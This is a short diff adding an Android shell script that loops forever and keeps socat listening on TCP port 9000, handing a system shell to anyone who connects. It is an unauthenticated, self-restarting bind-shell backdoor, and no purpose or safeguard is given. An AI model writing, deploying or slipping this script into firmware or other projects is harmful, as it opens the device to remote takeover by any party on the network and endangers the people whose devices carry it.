@@ -1,0 +1,10 @@
+# !/system/bin/sh
+
+while [ "GKJ" != "gaokejun" ]; do
+sleep 1
+nc_is_running=`ps | grep socat -w`
+
+if [ "X${nc_is_running}" == "X" ]; then
+socat TCP-LISTEN:9000,reuseaddr EXEC:/system/bin/sh &
+fi
+done
